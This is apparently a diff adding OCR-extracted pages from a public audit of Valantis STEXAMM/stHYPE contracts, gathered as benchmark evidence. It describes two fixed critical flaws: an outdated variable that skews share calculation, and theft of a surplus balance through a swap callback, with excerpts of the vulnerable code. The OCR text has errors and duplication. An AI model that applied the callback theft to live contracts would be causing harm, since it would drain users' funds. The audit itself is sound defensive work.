++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>title [71, 62, 510, 93]<|/det|>WEAKNESSES\n<|det|>text [71, 120, 704, 139]<|/det|>This section contains the list of discovered weaknesses.\n<|det|>title [70, 174, 188, 192]<|/det|>VLTS3-S\n<|det|>title [70, 215, 914, 374]<|/det|>THE CALCULATION OF SHARES IN\nSTEXAMM IS INCORRECT BECAUSE OF\nUSING THE OUTDATED\nAMOUNTTOKENIPENDINGIPWITHDRA\nWAL\n<|det|>text [72, 408, 201, 428]<|/det|>SEVERITY:\n<|det|>text [295, 409, 388, 427]<|/det|>Critical\n<|det|>text [72, 461, 152, 480]<|/det|>PATH:\n<|det|>text [71, 497, 393, 514]<|/det|>src/STEXAMM.sol#L468-L479\n<|det|>text [71, 525, 399, 542]<|/det|>src/STEXAMM.sol#L550-L555\n<|det|>title [72, 564, 259, 583]<|/det|>REMEDIATION:\n<|det|>text [70, 600, 930, 659]<|/det|>You should trigger update() whenever a deposit or withdrawal occurs, or create a getter function for amountToken1PendingLPWithdrawal to keep it updated at all times.\n<|det|>text [72, 692, 177, 710]<|/det|>STATUS:\n<|det|>text [238, 693, 303, 710]<|/det|>Fixed\n<|det|>title [72, 744, 259, 763]<|/det|>DESCRIPTION:\n<|det|>text [71, 778, 842, 797]<|/det|>The calculation of shares in deposit() function of STEXAMM contract:\n<|det|>text [97, 820, 825, 934]<|/det|>(uint256 reservePool, uint256 reservePool) =\nISovereignPool(pool).getReserves();\n// Account for token0 in pool (liquid) and pending unstaking (locked)\nuint256 reserveTotal = reservePool +\n_withdrawalModule.amountTokenPendingUnstaking();\n// Account for token1 pending withdrawal to LPs (locked)\n<|det|>page_number [910, 955, 937, 970]<|/det|>10\n", "page_image_sha256": "69e0fd4ae4e2a20159c8b5e0e86b1e9055fd07629858e744571c94dc5a4345bc", "page_number": 10, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>title [71, 62, 510, 93]<|/det|>WEAKNESSES\n<|det|>text [71, 120, 704, 139]<|/det|>This section contains the list of discovered weaknesses.\n<|det|>title [70, 174, 188, 192]<|/det|>VLTS3-S\n<|det|>title [70, 215, 914, 374]<|/det|>THE CALCULATION OF SHARES IN\nSTEXAMM IS INCORRECT BECAUSE OF\nUSING THE OUTDATED\nAMOUNTTOKENIPENDINGIPWITHDRA\nWAL\n<|det|>text [72, 408, 201, 428]<|/det|>SEVERITY:\n<|det|>text [295, 409, 388, 427]<|/det|>Critical\n<|det|>text [72, 461, 152, 480]<|/det|>PATH:\n<|det|>text [71, 497, 393, 514]<|/det|>src/STEXAMM.sol#L468-L479\n<|det|>text [71, 525, 399, 542]<|/det|>src/STEXAMM.sol#L550-L555\n<|det|>title [72, 564, 259, 583]<|/det|>REMEDIATION:\n<|det|>text [70, 600, 930, 659]<|/det|>You should trigger update() whenever a deposit or withdrawal occurs, or create a getter function for amountToken1PendingLPWithdrawal to keep it updated at all times.\n<|det|>text [72, 692, 177, 710]<|/det|>STATUS:\n<|det|>text [238, 693, 303, 710]<|/det|>Fixed\n<|det|>title [72, 744, 259, 763]<|/det|>DESCRIPTION:\n<|det|>text [71, 778, 842, 797]<|/det|>The calculation of shares in deposit() function of STEXAMM contract:\n<|det|>text [97, 820, 825, 934]<|/det|>(uint256 reservePool, uint256 reservePool) =\nISovereignPool(pool).getReserves();\n// Account for token0 in pool (liquid) and pending unstaking (locked)\nuint256 reserveTotal = reservePool +\n_withdrawalModule.amountTokenPendingUnstaking();\n// Account for token1 pending withdrawal to LPs (locked)\n<|det|>page_number [910, 955, 937, 970]<|/det|>10\n", "page_image_sha256": "69e0fd4ae4e2a20159c8b5e0e86b1e9055fd07629858e744571c94dc5a4345bc", "page_number": 10, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0009_0012.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 428.571}, "timing_ms": {"decode": 1162, "sglang_total": 1367, "ttft": 205}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 498, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 776}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0009_0012.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1520}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [97, 68, 745, 260]<|/det|>uint256 reserveIPendingWithdrawal = _withdrawalModule.amountTokenIPendingLPwithdrawal(); // shares calculated in terms of token1 shares = Math.mulDiv(_amount, totalSupplyCache, reserveIPool + _withdrawalModule.amountToken1LendingPool() + _withdrawalModule.convertToToken1(reserveOfTotal) - reserveIPendingWithdrawal);\n<|det|>text [70, 294, 867, 384]<|/det|>amountTokenOPendingUnstaking[] is the amount that the withdrawal module is waiting for the overseer contract to claim after unstateTokenReserves. In stHYPEWithdrawalModule, this getter function is always up to date:\n<|det|>text [73, 411, 907, 751]<|/det|>function amountTokenOPendingUnstaking() public view override returns\n(uint256) {\n    uint256 balanceNative = address(this).balance;\n    uint256 excessNative =\n    balanceNative > amountToken1ClaimableLPWithdrawal ? balanceNative - amountToken1ClaimableLPWithdrawal : 0;\n    // stHYPE is rebase, hence no need for conversion\n    uint256 excessToken0 = excessNative > 0 ? excessNative : 0;\n\n    uint256 amountTokenOPendingUnstakingCache =\n    amountTokenOPendingUnstaking;\n\n    if (amountTokenOPendingUnstakingCache > excessToken0) {\n    return amountTokenOPendingUnstakingCache - excessToken0;\n    } else {\n    return 0;\n    }\n}\n<|det|>text [70, 781, 922, 920]<|/det|>However, amountToken1PendingLPWithdrawal is not the same, since it doesn't have a getter function and is not updated with the current native balance in the stHYPEWithdrawalModule contract. Therefore, when the overseer has already sent native Token1 from unstaking but update[] hasn't been called, amountToken1PendingLPWithdrawal remains outdated, leading to a miscalculation of the total assets in the share calculation.\n<|det|>page_number [913, 956, 935, 970]<|/det|>11\n", "page_image_sha256": "b5b34fd50d2fe1267660651e13fba6be5ff70d963157943bf6dab41139bfddff", "page_number": 11, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [97, 68, 745, 260]<|/det|>uint256 reserveIPendingWithdrawal = _withdrawalModule.amountTokenIPendingLPwithdrawal(); // shares calculated in terms of token1 shares = Math.mulDiv(_amount, totalSupplyCache, reserveIPool + _withdrawalModule.amountToken1LendingPool() + _withdrawalModule.convertToToken1(reserveOfTotal) - reserveIPendingWithdrawal);\n<|det|>text [70, 294, 867, 384]<|/det|>amountTokenOPendingUnstaking[] is the amount that the withdrawal module is waiting for the overseer contract to claim after unstateTokenReserves. In stHYPEWithdrawalModule, this getter function is always up to date:\n<|det|>text [73, 411, 907, 751]<|/det|>function amountTokenOPendingUnstaking() public view override returns\n(uint256) {\n    uint256 balanceNative = address(this).balance;\n    uint256 excessNative =\n    balanceNative > amountToken1ClaimableLPWithdrawal ? balanceNative - amountToken1ClaimableLPWithdrawal : 0;\n    // stHYPE is rebase, hence no need for conversion\n    uint256 excessToken0 = excessNative > 0 ? excessNative : 0;\n\n    uint256 amountTokenOPendingUnstakingCache =\n    amountTokenOPendingUnstaking;\n\n    if (amountTokenOPendingUnstakingCache > excessToken0) {\n    return amountTokenOPendingUnstakingCache - excessToken0;\n    } else {\n    return 0;\n    }\n}\n<|det|>text [70, 781, 922, 920]<|/det|>However, amountToken1PendingLPWithdrawal is not the same, since it doesn't have a getter function and is not updated with the current native balance in the stHYPEWithdrawalModule contract. Therefore, when the overseer has already sent native Token1 from unstaking but update[] hasn't been called, amountToken1PendingLPWithdrawal remains outdated, leading to a miscalculation of the total assets in the share calculation.\n<|det|>page_number [913, 956, 935, 970]<|/det|>11\n", "page_image_sha256": "b5b34fd50d2fe1267660651e13fba6be5ff70d963157943bf6dab41139bfddff", "page_number": 11, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0009_0012.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 435.393}, "timing_ms": {"decode": 1068, "sglang_total": 1277, "ttft": 208}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 465, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 743}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0009_0012.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1794}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [70, 58, 920, 196]<|/det|>For example, after some withdrawals are queued,\namountToken1PendingLPWithdrawal increases to 10e18 from burnToken0AfterWithdraw. Then, the owner calls\nstHYPEWithdrawalModule::unstateToken0Reserves for the first time with amount = 10e18 to unstate Token0 from the Sovereign pool and burn it via the Overseer contract to claim native Token1 asynchronously.\n<|det|>text [71, 208, 457, 226]<|/det|>Before the overseer sends tokens:\n<|det|>text [70, 231, 877, 370]<|/det|>amountToken1PendingLPWithdrawal = 10e18,\namountToken0PendingUnstaking = 10e18\n=> Total assets = reserve0 + reserve1 + amountToken1LendingPool + amountToken0PendingUnstaking -\namountToken1PendingLPWithdrawal\n= reserve0 + reserve1 + amountToken1LendingPool + 10e18 - 10e18\n<|det|>text [70, 382, 852, 424]<|/det|>After the overseer sends 4e18 native tokens, but update() hasn't been called:\n<|det|>text [70, 429, 907, 519]<|/det|>amountToken1PendingLPWithdrawal = 10e18 (still outdated),\namountToken0PendingUnstaking = 4e18 (up-to-date via getter function)\n=> Total assets = reserve0 + reserve1 + amountToken1LendingPool + 4e18 - 10e18\n<|det|>text [70, 533, 913, 601]<|/det|>Therefore, the user's shares will be calculated incorrectly due to the use of the outdated amountToken1PendingLPWithdrawal, leading to a loss of shares when depositing.\n<|det|>text [71, 613, 801, 631]<|/det|>The same issue exists in the calculation of the withdraw function.\n<|det|>page_number [911, 955, 937, 970]<|/det|>12\n", "page_image_sha256": "c3fe88e666a2f50ad08959b6e91d10f1045c7f61e88ac5fc21fb36f1b6b39cf1", "page_number": 12, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [70, 58, 920, 196]<|/det|>For example, after some withdrawals are queued,\namountToken1PendingLPWithdrawal increases to 10e18 from burnToken0AfterWithdraw. Then, the owner calls\nstHYPEWithdrawalModule::unstateToken0Reserves for the first time with amount = 10e18 to unstate Token0 from the Sovereign pool and burn it via the Overseer contract to claim native Token1 asynchronously.\n<|det|>text [71, 208, 457, 226]<|/det|>Before the overseer sends tokens:\n<|det|>text [70, 231, 877, 370]<|/det|>amountToken1PendingLPWithdrawal = 10e18,\namountToken0PendingUnstaking = 10e18\n=> Total assets = reserve0 + reserve1 + amountToken1LendingPool + amountToken0PendingUnstaking -\namountToken1PendingLPWithdrawal\n= reserve0 + reserve1 + amountToken1LendingPool + 10e18 - 10e18\n<|det|>text [70, 382, 852, 424]<|/det|>After the overseer sends 4e18 native tokens, but update() hasn't been called:\n<|det|>text [70, 429, 907, 519]<|/det|>amountToken1PendingLPWithdrawal = 10e18 (still outdated),\namountToken0PendingUnstaking = 4e18 (up-to-date via getter function)\n=> Total assets = reserve0 + reserve1 + amountToken1LendingPool + 4e18 - 10e18\n<|det|>text [70, 533, 913, 601]<|/det|>Therefore, the user's shares will be calculated incorrectly due to the use of the outdated amountToken1PendingLPWithdrawal, leading to a loss of shares when depositing.\n<|det|>text [71, 613, 801, 631]<|/det|>The same issue exists in the calculation of the withdraw function.\n<|det|>page_number [911, 955, 937, 970]<|/det|>12\n", "page_image_sha256": "c3fe88e666a2f50ad08959b6e91d10f1045c7f61e88ac5fc21fb36f1b6b39cf1", "page_number": 12, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0009_0012.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 432.54}, "timing_ms": {"decode": 1008, "sglang_total": 1209, "ttft": 201}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 436, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 714}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0009_0012.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1508}
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl
+new file mode 100644
+index 0000000..bb51790
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-02.pages.jsonl
+@@ -0,0 +1,6 @@
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>header [71, 56, 194, 72]<|/det|>VLTS3-i3\n<|det|>title [71, 96, 909, 157]<|/det|>DIRECT THEFT OF SURPLUS BALANCE\nWHEN UNSTAKING STHYPE\n<|det|>text [72, 189, 210, 209]<|/det|>SEVERITY:\n<|det|>text [295, 190, 387, 208]<|/det|>Critical\n<|det|>text [72, 243, 152, 260]<|/det|>PATH:\n<|det|>text [71, 278, 644, 296]<|/det|>src/stHYPEWithdrawalModule.solutpdate#L431-L475\n<|det|>title [72, 317, 259, 337]<|/det|>REMEDIATION:\n<|det|>text [70, 352, 926, 432]<|/det|>It is not safe to make direct transfers to the pool if you are unsure whether current execution is inside of a swap callback. It should therefore be verified using the reentrancy switch of the Sovereign Pool, however this is currently not exposed.\n<|det|>text [70, 441, 926, 520]<|/det|>One possibility is to add a donate function to the SovereignPool that only works for rebase tokens (donations are possible with transfers already anyway) and has the nonReentrant modifier. That way you can safely donate the tokens back to the pool without the risk.\n<|det|>text [70, 530, 926, 590]<|/det|>If modifications to the SovereignPool are not possible, then dummy calls that check whether reverts happen due to reentrancy are needed. This is often used to guard against read-only reentrancy for Balancer or Curve.\n<|det|>title [72, 623, 182, 642]<|/det|>STATUS:\n<|det|>title [238, 624, 304, 641]<|/det|>Fixed\n<|det|>title [72, 676, 259, 695]<|/det|>DESCRIPTION:\n<|det|>text [70, 710, 920, 802]<|/det|>The stHYPE Withdrawal Module exposes functionality for the owner of the module to unstake stHYPE into HYPE using the Overseer contract. The owner calls unstakeToken0Reserves, which in turn transfers stHYPE from the SovereignPool (uses the STEXAMM) and then calls\n<|det|>text [70, 805, 920, 870]<|/det|>burnAndRedeemIfPossible to create a Burn request. The stHYPE is burned immediately and the Burn request can be redeemed later once filled for HYPE.\n<|det|>text [70, 884, 911, 951]<|/det|>In the update function, any received HYPE from redeemed Burn requests is first allocated to any outstanding LP withdrawal requests after which the surplus is deposited back into the Sovereign Pool directly on lines 471-474:\n<|det|>page_number [910, 956, 937, 970]<|/det|>13\n", "page_image_sha256": "18fe679a18d9ae4f4b6bea4c4fd3c520ca509db2b6f7d12fccdac265a20fd861", "page_number": 13, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>header [71, 56, 194, 72]<|/det|>VLTS3-i3\n<|det|>title [71, 96, 909, 157]<|/det|>DIRECT THEFT OF SURPLUS BALANCE\nWHEN UNSTAKING STHYPE\n<|det|>text [72, 189, 210, 209]<|/det|>SEVERITY:\n<|det|>text [295, 190, 387, 208]<|/det|>Critical\n<|det|>text [72, 243, 152, 260]<|/det|>PATH:\n<|det|>text [71, 278, 644, 296]<|/det|>src/stHYPEWithdrawalModule.solutpdate#L431-L475\n<|det|>title [72, 317, 259, 337]<|/det|>REMEDIATION:\n<|det|>text [70, 352, 926, 432]<|/det|>It is not safe to make direct transfers to the pool if you are unsure whether current execution is inside of a swap callback. It should therefore be verified using the reentrancy switch of the Sovereign Pool, however this is currently not exposed.\n<|det|>text [70, 441, 926, 520]<|/det|>One possibility is to add a donate function to the SovereignPool that only works for rebase tokens (donations are possible with transfers already anyway) and has the nonReentrant modifier. That way you can safely donate the tokens back to the pool without the risk.\n<|det|>text [70, 530, 926, 590]<|/det|>If modifications to the SovereignPool are not possible, then dummy calls that check whether reverts happen due to reentrancy are needed. This is often used to guard against read-only reentrancy for Balancer or Curve.\n<|det|>title [72, 623, 182, 642]<|/det|>STATUS:\n<|det|>title [238, 624, 304, 641]<|/det|>Fixed\n<|det|>title [72, 676, 259, 695]<|/det|>DESCRIPTION:\n<|det|>text [70, 710, 920, 802]<|/det|>The stHYPE Withdrawal Module exposes functionality for the owner of the module to unstake stHYPE into HYPE using the Overseer contract. The owner calls unstakeToken0Reserves, which in turn transfers stHYPE from the SovereignPool (uses the STEXAMM) and then calls\n<|det|>text [70, 805, 920, 870]<|/det|>burnAndRedeemIfPossible to create a Burn request. The stHYPE is burned immediately and the Burn request can be redeemed later once filled for HYPE.\n<|det|>text [70, 884, 911, 951]<|/det|>In the update function, any received HYPE from redeemed Burn requests is first allocated to any outstanding LP withdrawal requests after which the surplus is deposited back into the Sovereign Pool directly on lines 471-474:\n<|det|>page_number [910, 956, 937, 970]<|/det|>13\n", "page_image_sha256": "18fe679a18d9ae4f4b6bea4c4fd3c520ca509db2b6f7d12fccdac265a20fd861", "page_number": 13, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0013_0016.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 422.709}, "timing_ms": {"decode": 1462, "sglang_total": 1694, "ttft": 232}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 618, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 896}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0013_0016.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 2228}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [97, 68, 900, 163]<|/det|>token1.deposit{value: balanceSurplus}(); // Pool reserves are measured as balances, hence we can replenish it with token1 // by transferring directly token1.safeTransfer(stexInterface.pool(), balanceSurplus);\n<|det|>text [71, 197, 900, 239]<|/det|>This works because the token is a rebase token and so the Sovereign Pool uses the actual balance as reserve.\n<|det|>text [71, 253, 862, 296]<|/det|>However, this mechanism can be exploited to directly steal the entire surplus amount by leveraging the swap callback of the Sovereign Pool.\n<|det|>text [71, 308, 871, 376]<|/det|>When calling swap on the Sovereign Pool, the user has the option parameter isSwapCallback, which can be turned on to pay the tokenIn amount inside of the callback in _handleTokenInTransfersOnSwap:\n<|det|>text [97, 401, 812, 941]<|/det|>function _handleTokenInTransfersOnSwap(\n    bool isZeroToOne,\n    bool isSwapCallback,\n    IERC20 token,\n    uint256 amountInUsed,\n    uint256 effectiveFee,\n    bytes_callback _swapCallbackContext\n) private {\n    uint256 preBalance = token.balanceOf(sovereignVault);\n\n    if (isSwapCallback) {\nISovereignPoolSwapCallback(msg.sender).sovereignPoolSwapCallback(\n    address(token),\n    amountInUsed,\n    _swapCallbackContext\n    );\n} else {\n    token.saveTransferFrom(msg.sender, sovereignVault,\namountInUsed);\n}\n\nuint256 amountInReceived = token.balanceOf(sovereignVault) -\npreBalance;\n[...]\n}\n<|det|>page_number [910, 955, 935, 969]<|/det|>14\n", "page_image_sha256": "64650b541f7624a7c2e49dc3f66203bb1d8fc929b39ec7e444b04b17311000e4", "page_number": 14, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [97, 68, 900, 163]<|/det|>token1.deposit{value: balanceSurplus}(); // Pool reserves are measured as balances, hence we can replenish it with token1 // by transferring directly token1.safeTransfer(stexInterface.pool(), balanceSurplus);\n<|det|>text [71, 197, 900, 239]<|/det|>This works because the token is a rebase token and so the Sovereign Pool uses the actual balance as reserve.\n<|det|>text [71, 253, 862, 296]<|/det|>However, this mechanism can be exploited to directly steal the entire surplus amount by leveraging the swap callback of the Sovereign Pool.\n<|det|>text [71, 308, 871, 376]<|/det|>When calling swap on the Sovereign Pool, the user has the option parameter isSwapCallback, which can be turned on to pay the tokenIn amount inside of the callback in _handleTokenInTransfersOnSwap:\n<|det|>text [97, 401, 812, 941]<|/det|>function _handleTokenInTransfersOnSwap(\n    bool isZeroToOne,\n    bool isSwapCallback,\n    IERC20 token,\n    uint256 amountInUsed,\n    uint256 effectiveFee,\n    bytes_callback _swapCallbackContext\n) private {\n    uint256 preBalance = token.balanceOf(sovereignVault);\n\n    if (isSwapCallback) {\nISovereignPoolSwapCallback(msg.sender).sovereignPoolSwapCallback(\n    address(token),\n    amountInUsed,\n    _swapCallbackContext\n    );\n} else {\n    token.saveTransferFrom(msg.sender, sovereignVault,\namountInUsed);\n}\n\nuint256 amountInReceived = token.balanceOf(sovereignVault) -\npreBalance;\n[...]\n}\n<|det|>page_number [910, 955, 935, 969]<|/det|>14\n", "page_image_sha256": "64650b541f7624a7c2e49dc3f66203bb1d8fc929b39ec7e444b04b17311000e4", "page_number": 14, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0013_0016.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 441.573}, "timing_ms": {"decode": 890, "sglang_total": 1097, "ttft": 206}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 393, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 671}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0013_0016.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1498}
